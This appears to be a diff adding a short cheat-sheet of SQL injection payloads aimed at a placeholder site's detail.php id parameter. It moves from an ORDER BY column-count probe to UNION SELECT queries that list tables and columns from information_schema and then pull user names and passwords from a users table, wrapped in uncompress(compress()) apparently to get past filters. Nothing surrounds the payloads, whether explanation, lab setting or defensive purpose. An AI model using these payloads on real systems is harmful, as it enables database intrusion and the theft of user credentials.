@@ -1,0 +1,8 @@
+http://www.exampletarget.com/detail.php?id=31 order by 6-- -
+We Got Error Here.
+
+UNION SELECT 1,uncompress(compress(concat(table_name))),3 from information_schema.tables where table_schema=database();
+
+UNION SELECT 1,uncompress(compress(group_concat(column_name,%200x0a))),3 from information_schema.columns where table_name="tb_productos"#;
+
+UNION SELECT 1,uncompress(compress(NomUser)),uncompress(compress(Passwd)) from tb_usuarios;
